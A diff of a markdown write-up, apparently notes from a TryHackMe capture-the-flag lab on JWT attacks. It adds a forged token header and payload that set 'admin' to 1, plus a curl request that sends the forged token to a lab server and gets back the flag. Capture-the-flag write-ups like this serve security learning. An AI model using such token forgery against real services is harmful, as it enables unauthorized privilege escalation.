@@ -179,12 +179,27 @@ ajdev@rootbox:~$ curl -H 'Content-Type: application/json' -X POST -d '{ "usernam
 }
 
 # manipulation the jwt
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
 
-
+{
+  "username": "admin",
+  "admin": 1
+}
 
 ajdev@rootbox:~$ curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9.SurGPm4eIK-v-gtvSzHAI6rEttfMA-2Q-Q2XyNFBAuM' http://10.49.170.207/api/v1.0/example2?username=admin
 {
   "message": "Welcome admin, you are an admin, here is your flag: THM{6e32dca9-0d10-4156-a2d9-5e5c7000648a}"
 }
 ```
+
+---
+### Weak Symmetric Secrets
+
+
+
+
+
 
